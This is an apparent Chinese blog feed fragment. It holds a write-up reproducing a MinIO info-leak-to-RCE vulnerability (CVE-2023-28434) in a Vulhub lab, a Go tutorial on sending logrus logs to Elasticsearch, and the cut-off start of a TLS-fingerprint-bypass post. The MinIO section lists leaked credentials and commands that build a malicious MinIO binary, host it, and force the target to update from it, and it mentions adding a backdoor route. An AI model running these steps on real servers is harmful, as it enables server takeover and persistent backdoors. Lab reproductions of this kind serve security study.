class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node3:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:false</span>&#125;]<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;CmdLine&quot;</span>:<span class="hljs-string">&quot;http://node1:9000/mnt/data1 http://node2:9000/mnt/data2 http://node3:9000/mnt/data3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Platform&quot;</span>:<span class="hljs-string">&quot;OS: linux | Arch: amd64&quot;</span>&#125;]<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MinioEnv&quot;</span>:&#123;<span class="hljs-string">&quot;MINIO_ACCESS_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;access_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_CONFIG_ENV_FILE&quot;</span>:<span class="hljs-string">&quot;config.env&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_KMS_SECRET_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;kms_master_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_PASSWORD&quot;</span>:<span class="hljs-string">&quot;minioadmin-vulhub&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_PASSWORD_FILE&quot;</span>:<span class="hljs-string">&quot;secret_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_USER&quot;</span>:<span class="hljs-string">&quot;minioadmin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_USER_FILE&quot;</span>:<span class="hljs-string">&quot;access_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_SECRET_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;secret_key&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>可以查看<code>MINIO_ROOT_PASSWOR</code>和<code>MINIO_ROOT_USER</code></p><p>登陆成功。</p><p><img src="/./../blog_image/image-20231226215859605.png" alt="image-20231226215859605"></p><h2 id="1-2-连接minio客户端："><a href="#1-2-连接minio客户端：" class="headerlink" title="1.2 连接minio客户端："></a>1.2 连接minio客户端：</h2><p>为了更好的管理minio，官方提供了mc工具，通过输入账号和密码即可连接成功。</p><p>安装mc指令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://dl.min.io/client/mc/release/linux-amd64/mc \<br>  --create-dirs \<br>  -o <span class="hljs-variable">$HOME</span>/minio-binaries/mc<br><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$HOME</span>/minio-binaries/mc<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$HOME</span>/minio-binaries/<br></code></pre></td></tr></table></figure><p><strong>添加实例：</strong></p><p>使用命令<code>mc config host add miniode1 http://10.10.10.129:9000 minioadmin minioadmin-vulhub</code>进行连接，后面传入的分别是账号和密码。</p><p><img src="/./../blog_image/image-20231226215906800.png" alt="image-20231226215906800"></p><p>这里留个坑，不会使用cyberduck连接上minio。</p><p><img src="/./../blog_image/image-20231226215911642.png" alt="image-20231226215911642"></p><h1 id="2-RCE-复现"><a href="#2-RCE-复现" class="headerlink" title="2.RCE 复现"></a>2.RCE 复现</h1><h2 id="2-1-配置mc指令："><a href="#2-1-配置mc指令：" class="headerlink" title="2.1 配置mc指令："></a>2.1 配置mc指令：</h2><p>上面所述，minio的mc(minio的客户端)可以远程升级minio服务器，而关键在于升级地址是一个可以通过预自定义的。</p><p>可以从下面的连接进行下载源代码。</p><p><a href="https://github.com/AbelChe/evil_minio">AbelChe&#x2F;evil_minio: EXP for CVE-2023-28434 MinIO unauthorized to RCE (github.com)</a></p><p>查看官方文档，查看使用<code>mc admin</code>的使用：**<a href="https://min.io/docs/minio/linux/reference/minio-mc-admin.html">MinIO Admin Client — MinIO Object Storage for Linux</a>**</p><p><img src="/./../blog_image/image-20231226215918047.png" alt="image-20231226215918047"></p><h2 id="2-2-update实现rce"><a href="#2-2-update实现rce" class="headerlink" title="2.2 update实现rce:"></a>2.2 update实现rce:</h2><p>拉取大佬修改好的minio(其实是懒得找源码，自己修改)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/AbelChe/evil_minio.git<br>go env -w GOPROXY=https://goproxy.cn,direct // 设置代理<br>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=&quot;-s -w&quot; -trimpath //编译<br>//重命名<br>mv minio minio.RELEASE.2023-03-22T06-36-24Z<br>//shasum校验<br>shasum -a 256 minio.RELEASE.2023-03-22T06-36-24Z &gt; minio.RELEASE.2023-03-22T06-36-24Z.sha256sum<br>启动http服务<br>python3 -m http.server 18090<br></code></pre></td></tr></table></figure><p>然后我们可以创建一个桶，直观看到变化：</p><p>接着我们执行更新操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">添加 MinIO服务案例</span><br>mc config host add docker_minio1 http://10.10.10.129:9000 minioadmin minioadmin-vulhub<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">ls</span>命令 - 列出对象(可以不执行这一步)</span><br>mc ls miniode1<br><span class="hljs-meta prompt_">#</span><span class="language-bash">下载更新包更新</span><br>mc admin update miniode1 http://10.211.55.2:18090/minio.RELEASE.2023-03-22T06-36-24Z.sha256sum -y<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231226215932676.png" alt="image-20231226215932676"></p><p>最终效果如图所示：</p><p><img src="/./../blog_image/image-20231226215937704.png" alt="image-20231226215937704"></p><p><img src="/./../blog_image/image-20231226215942747.png" alt="image-20231226215942747"></p><p>成功更新并且实现了rce。</p><h1 id="3-漏洞原理重现："><a href="#3-漏洞原理重现：" class="headerlink" title="3.漏洞原理重现："></a>3.漏洞原理重现：</h1><h2 id="3-1-代码审计："><a href="#3-1-代码审计：" class="headerlink" title="3.1 代码审计："></a>3.1 代码审计：</h2><h3 id="信息泄露从何而来？"><a href="#信息泄露从何而来？" class="headerlink" title="信息泄露从何而来？"></a>信息泄露从何而来？</h3><p>在<code>cmd/routers.go</code>中<code>configureServerHandler</code>是注册路由方法，如图所示：</p><p><img src="/./../blog_image/image-20231226215947872.png" alt="image-20231226215947872"></p><p>其中根据漏洞报告可以知道，信息泄露的相关api是<code>bootStrap</code>相关的。</p><p>因此初步推断是<code>registerDistErasureRouters</code>中注册<code>bootStrap</code>相关的路由，如图所示：</p><p><img src="/./../blog_image/image-20231226215952177.png" alt="image-20231226215952177"></p><p>接着查看<code>registerBootStrapRESTHandlers</code>可以看到<code>verify</code>路由。</p><p><img src="/./../blog_image/image-20231226215959798.png" alt="image-20231226215959798"></p><p>查看<code>server.HealthHandler</code>函数：</p><p><img src="/./../blog_image/image-20231226220004077.png" alt="image-20231226220004077"></p><p>可以看到存在敏感信息，即<code>getServerSystemCfg</code>函数，点击后查看该函数返回的值是<code>ServerSystemConfig</code>结构体，这个结构体中包含了环境变量<code>MINIO_</code>的相关敏感信息：</p><p><img src="/./../blog_image/image-20231226220008853.png" alt="image-20231226220008853"></p><p>获取了环境变量后用了for循环对<code>envValues</code>这个map赋值，而这个<code>skipEnvs</code>就是罪大恶极的map，里面包含了账号密码等敏感信息。</p><p><img src="/./../blog_image/image-20231226220014606.png" alt="image-20231226220014606"></p><p>所以这个<code>skipEnvs[envK]</code>是什么呢？根据官方说明，MinIO在启动时会从环境变量中读取预先设置的用户和密码，默认情况下：minioadmin&#x2F;minioadmin。就是说如果环境变量存在，则不对其赋值，如果不存在则会抛到上一层，最终判断为空则会使用默认账号密码。</p><h3 id="更新RCE从何而来？"><a href="#更新RCE从何而来？" class="headerlink" title="更新RCE从何而来？"></a>更新RCE从何而来？</h3><p>可以查看<code>cmd/update.go</code>，其中全局变量已经设置到了相关的更新路径，如图所示：</p><p><img src="/./../blog_image/image-20231226220018632.png" alt="image-20231226220018632"></p><p>minio在更新的时候会对更新包进行sha256sum，但由于<code>envMinisignPubKey</code>为空，所以校验无效了：</p><p><img src="/./../blog_image/image-20231226220022081.png" alt="image-20231226220022081"></p><h2 id="3-2-无损RCR-后门："><a href="#3-2-无损RCR-后门：" class="headerlink" title="3.2 无损RCR+后门："></a>3.2 无损RCR+后门：</h2><p>如何编写一个路由呢？</p><p>在<code>cmd/routers.go</code>中的<code>globalHandler</code>添加自己的router,如图所示：</p><p><img src="/./../blog_image/image-20231226220026088.png" alt="image-20231226220026088"></p><p>在<code>generic-handlers.go</code>中添加<code>handler</code></p><p><img src="/./../blog_image/image-20231226220030207.png" alt="image-20231226220030207"></p><p>创建一个函数判断当前系统是window还是linux，如图所示：</p><p><img src="/./../blog_image/image-20231226220034525.png" alt="image-20231226220034525"></p><p>参考文章：</p><blockquote><p><a href="https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ">MinIO从信息泄漏到RCE复现 (qq.com)</a></p><p><a href="https://min.io/docs/minio/linux/reference/minio-mc-admin/mc-admin-update.html">mc admin update — MinIO Object Storage for Linux</a></p><p><a href="https://github.com/AbelChe/evil_minio">AbelChe&#x2F;evil_minio: EXP for CVE-2023-28434 MinIO unauthorized to RCE (github.com)</a></p><p><a href="https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ">MinIO从信息泄漏到RCE复现 (qq.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>云原生安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>minio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>logrus实现日志推送</title>
    <link href="/2023/12/08/logrus%E5%AE%9E%E7%8E%B0%E6%97%A5%E5%BF%97%E6%8E%A8%E9%80%81/"/>
    <url>/2023/12/08/logrus%E5%AE%9E%E7%8E%B0%E6%97%A5%E5%BF%97%E6%8E%A8%E9%80%81/</url>
    
    <content type="html"><![CDATA[<h1 id="1-logrus介绍："><a href="#1-logrus介绍：" class="headerlink" title="1.logrus介绍："></a>1.logrus介绍：</h1><p>导入包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go get -u github.com/sirupsen/logrus<br></code></pre></td></tr></table></figure><h2 id="1-1-logrus基础配置："><a href="#1-1-logrus基础配置：" class="headerlink" title="1.1 logrus基础配置："></a>1.1 logrus基础配置：</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> LogrusObj *logrus.Logger<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitLog</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">if</span> LogrusObj != <span class="hljs-literal">nil</span> &#123;<br>       file, err := setOutputFile()<br>       <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>          <span class="hljs-built_in">panic</span>(err)<br>       &#125;<br>       LogrusObj.SetOutput(file)<br>       <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// 初始化</span><br>    logger := logrus.New()<br>    file, err := setOutputFile()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-built_in">panic</span>(err)<br>    &#125;<br>    logger.SetOutput(file)<br>    logger.SetLevel(logrus.DebugLevel)<br>    logger.SetFormatter(&amp;logrus.JSONFormatter&#123;<br>       TimestampFormat: <span class="hljs-string">&quot;2006-01-02 15:04:05&quot;</span>,<br>    &#125;)<br>    LogrusObj = logger<br>&#125;<br></code></pre></td></tr></table></figure><p><code>setOutputFile</code>函数是设置日志输出的位置，这里的<code>setOutputFile</code>函数如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// setOutputFile 按照日期进行分割，如果不存在则创建，存在就写入日至中</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">setOutputFile</span><span class="hljs-params">()</span></span> (*os.File, <span class="hljs-type">error</span>) &#123;<br>    now := time.Now()<br>    dir, err := os.Getwd()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>    &#125;<br>    <span class="hljs-comment">// 设置日志文件位置</span><br>    logFilePath := filepath.Join(dir, <span class="hljs-string">&quot;/logs/&quot;</span>)<br><br>    <span class="hljs-comment">// 使用os.Stat 判断文件或文件夹是否存在</span><br>    <span class="hljs-comment">// 如果返回 err是nil则表明文件或文件夹存在</span><br>    <span class="hljs-comment">// 否则使用os.IsNotExists() 判断 ==》 如果为true则表明文件或文件夹不存在</span><br>    _, err = os.Stat(logFilePath)<br>    <span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br>       <span class="hljs-comment">// true 文件夹或文件不存在</span><br>       <span class="hljs-keyword">if</span> err = os.MkdirAll(logFilePath, <span class="hljs-number">0777</span>); err != <span class="hljs-literal">nil</span> &#123;<br>          log.Fatal(err)<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>       &#125;<br>    &#125;<br>    <span class="hljs-comment">// 文件夹存在</span><br>    logFileName := now.Format(FileNameLayOut) + <span class="hljs-string">&quot;.log&quot;</span><br>    fileName := filepath.Join(logFilePath, logFileName)<br><br>    <span class="hljs-comment">// err不为空 则需要使用os.IsNotExists()判断文件是否存在</span><br>    <span class="hljs-keyword">if</span> _, err = os.Stat(fileName); err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br>          <span class="hljs-comment">// 创建文件</span><br>          <span class="hljs-keyword">if</span> _, err = os.Create(fileName); err != <span class="hljs-literal">nil</span> &#123;<br>             log.Fatal(err)<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>          &#125;<br>       &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 写入文件</span><br>    <span class="hljs-comment">// O_WRONLY 以只写的方式</span><br>    <span class="hljs-comment">// O_APPEND 追加</span><br>    <span class="hljs-comment">// ModeAppend 只能写 且只能写到末尾</span><br>    file, err := os.OpenFile(fileName, os.O_APPEND|os.O_WRONLY, os.ModeAppend)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> file, err<br>&#125;<br></code></pre></td></tr></table></figure><p>主要逻辑有以下：</p><ul><li>获取项目的位置</li><li>使用<code>filepath.Join</code>将文件地址后加上<code>log</code></li><li>使用<code>os.Stat</code>用于判断文件或文件夹是否存在，如果返回err是nil表明存在，如果不为nil则需要使用<code>os.IsNotExists()</code>，如果返回true表明文件或文件夹不存在</li><li>文件夹不存在则创建，使用<code>os.MkdirAll(路径，权限)</code>。</li><li>文件夹存在，则可以组装日志文件的文件名，然后通过这个文件名去判断当前文件是否存在，如果不存在则创建。</li><li>如果文件存在则可以直接进行追加，需要注意这里需要提供flag。<code> os.O_APPEND|os.O_WRONLY, os.ModeAppend</code>分别表示以只写的方式，追加的方式，后面的<code>os.ModeAppend</code>表示给写的权限并且只能写道末尾。</li></ul><p>效果如图</p><p><img src="/./../blog_image/image-20231208133115437.png" alt="image-20231208133115437"></p><h2 id="1-2-logrus的其他配置："><a href="#1-2-logrus的其他配置：" class="headerlink" title="1.2 logrus的其他配置："></a>1.2 logrus的其他配置：</h2><p>logrus可以使用<code>WithFields</code>添加自己的一个字段，如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">logger := logrus.New()<br>logger.SetLevel(logrus.DebugLevel)<br>entry := logger.WithFields(logrus.Fields&#123;<br>    <span class="hljs-string">&quot;作者&quot;</span>: <span class="hljs-string">&quot;cz&quot;</span>,<br>&#125;)<br><br>entry.Info(<span class="hljs-string">&quot;nihao&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231208133129801.png" alt="image-20231208133129801"></p><p>可以使用<code>entry.Data</code>返回的是一个<code>map[string]interface&#123;&#125;</code>就是刚才设置<code>WithFields</code>的值。</p><h2 id="1-3-logrus的hook："><a href="#1-3-logrus的hook：" class="headerlink" title="1.3 logrus的hook："></a>1.3 logrus的hook：</h2><p>只需要实现<code>hook</code>这个接口，就可以了。</p><p>logrus调用中添加<code>AddHook(hook)</code>即可。</p><p>logrus的hook接口需要实现两个方法，如下：</p><p><img src="/./../blog_image/image-20231208133142522.png" alt="image-20231208133142522"></p><p>其中<code>Levels</code>方法是返回什么日志级别才会触发hook的，而<code>Fire</code>则是具体实现hook的逻辑。</p><h1 id="2-配置Es"><a href="#2-配置Es" class="headerlink" title="2.配置Es"></a>2.配置Es</h1><p>引用库：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">github.com/elastic/<span class="hljs-keyword">go</span>-elasticsearch<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs GO"><span class="hljs-keyword">var</span> EsClient *elasticsearch.Client<br><br><span class="hljs-comment">// InitEs 初始化es</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitEs</span><span class="hljs-params">()</span></span> &#123;<br>    esConn := fmt.Sprintf(<span class="hljs-string">&quot;http://%s:%s&quot;</span>, <span class="hljs-string">&quot;192.168.61.129&quot;</span>, <span class="hljs-string">&quot;9200&quot;</span>)<br>    cfg := elasticsearch.Config&#123;<br>       Addresses: []<span class="hljs-type">string</span>&#123;esConn&#125;,<br>    &#125;<br>    client, err := elasticsearch.NewClient(cfg)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Panic(err)<br>    &#125;<br>    EsClient = client<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-logrus实现日志推送"><a href="#3-logrus实现日志推送" class="headerlink" title="3.logrus实现日志推送"></a>3.logrus实现日志推送</h1><p>先定义一个结构体ElasticHook，其中需要实现<code>Hook</code>接口：</p><p><img src="/./../blog_image/image-20231208133151441.png" alt="image-20231208133151441"></p><p>ElasticHook结构体如图所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ElasticHook <span class="hljs-keyword">struct</span> &#123;<br>    Client        *elasticsearch.Client <span class="hljs-comment">// es的客户端</span><br>    Host          <span class="hljs-type">string</span>                <span class="hljs-comment">// es的host</span><br>    Index         IndexNameFunc         <span class="hljs-comment">// 获取索引的名字</span><br>    Level         []logrus.Level        <span class="hljs-comment">// 日志级别</span><br>    Ctx           context.Context       <span class="hljs-comment">// 上下文</span><br>    CtxCancelFunc context.CancelFunc    <span class="hljs-comment">// 上下文的函数</span><br>    FireFunc      FireFunc              <span class="hljs-comment">// 执行hook的方法</span><br>&#125;<br></code></pre></td></tr></table></figure><p>初始化es钩子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewElasticHook 创建一个es hook对象</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewElasticHook</span><span class="hljs-params">(client *elasticsearch.Client, host <span class="hljs-type">string</span>, level logrus.Level, index <span class="hljs-type">string</span>)</span></span> (*ElasticHook, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">return</span> newElasticHookWithFunc(client, host, level, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123; <span class="hljs-keyword">return</span> index &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>具体逻辑如图：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// newElasticHookWithFunc 创建一个es hook对象，通过IndexNameFunc这个方式</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newElasticHookWithFunc</span><span class="hljs-params">(client *elasticsearch.Client, host <span class="hljs-type">string</span>, level logrus.Level, indexFunc IndexNameFunc)</span></span> (*ElasticHook, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">var</span> levels []logrus.Level<br>    <span class="hljs-keyword">for</span> _, l := <span class="hljs-keyword">range</span> logrus.AllLevels &#123;<br>       <span class="hljs-comment">// 判断传入的level是在哪个等级上面</span><br>       <span class="hljs-keyword">if</span> level &gt;= l &#123;<br>          levels = <span class="hljs-built_in">append</span>(levels, l)<br>       &#125;<br>    &#125;<br>    ctx, cancelFunc := context.WithCancel(context.Background())<br>    <span class="hljs-keyword">return</span> &amp;ElasticHook&#123;<br>       Client:        client,<br>       Host:          host,<br>       Index:         indexFunc,<br>       Level:         levels,<br>       Ctx:           ctx,<br>       CtxCancelFunc: cancelFunc,<br>       FireFunc:      syncFireFunc,<br>    &#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>传入的level需要进行比较，比较日志是大于或等于的才会保存在这个钩子中的<code>Level</code>字段。</p><p>具体发送逻辑是<code>syncFireFunc</code>这个函数，具体用法如下：</p><p>主要是操作es逻辑。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// syncFireFunc 异步发送 实现hook函数的具体逻辑</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">syncFireFunc</span><span class="hljs-params">(entry *logrus.Entry, hook *ElasticHook)</span></span> <span class="hljs-type">error</span> &#123;<br>    msg := createMessage(entry, hook)<br>    data, err := json.Marshal(&amp;msg)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> err<br>    &#125;<br><br>    <span class="hljs-comment">// 操作es</span><br>    request := esapi.IndexRequest&#123;<br>       Index:   hook.Index(),<br>       Body:    bytes.NewReader(data),<br>       Refresh: <span class="hljs-string">&quot;true&quot;</span>,<br>    &#125;<br><br>    <span class="hljs-comment">// 发送请求</span><br>    resp, err := request.Do(hook.Ctx, hook.Client)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">return</span> err<br>    &#125;<br><br>    <span class="hljs-comment">// 解析响应</span><br>    <span class="hljs-comment">// todo 完善解析json的操作</span><br>    log.Println(resp.String())<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>将这个赋值给<code>ElasticHook</code>的<code>FireFunc</code>，在调用钩子的时候调用即可。</p><p>最终使用<code>curl --location &#39;http://localhost:9200/my_index/_search&#39;\?pretty </code></p><p>即可查看到结果</p><h1 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h1><p>查看<a href="">https://github.com/pow1e/es-logrus</a></p>]]></content>
    
    
    <categories>
      
      <category>golang开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tls指纹绕过</title>
    <link href="/2023/12/02/tls%E6%8C%87%E7%BA%B9%E7%BB%95%E8%BF%87/"/>
    <url>/2023/12/02/tls%E6%8C%87%E7%BA%B9%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>浏览器可以正常访问，但是用requests发送请求失败。</p><p>后端是如何监测得呢？为什么浏览器可以返回结果，而requests模块不行呢？</p><p><a href="https://cn.investing.com/equities/amazon-com-inc-historical-data">https://cn.investing.com/equities/amazon-com-inc-historical-data</a></p><p><img src="/./../blog_image/image-20231102222853489.png" alt="image-20231102222853489"></p><p><img src="/./../blog_image/image-20231102222951995.png" alt="image-20231102222951995"></p><h1 id="1-指纹校验案例"><a href="#1-指纹校验案例" class="headerlink" title="1.指纹校验案例"></a>1.指纹校验案例</h1><h2 id="1-1-案例：ascii2d"><a href="#1-1-案例：ascii2d" class="headerlink" title="1.1 案例：ascii2d"></a>1.1 案例：ascii2d</h2><p><a href="https://ascii2d.net/">https://ascii2d.net/</a></p><p><img src="/./../blog_image/image-20231102152118149.png" alt="image-20231102152118149"></p><p><img src="/./../blog_image/image-20231102152223565.png" alt="image-20231102152223565"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code 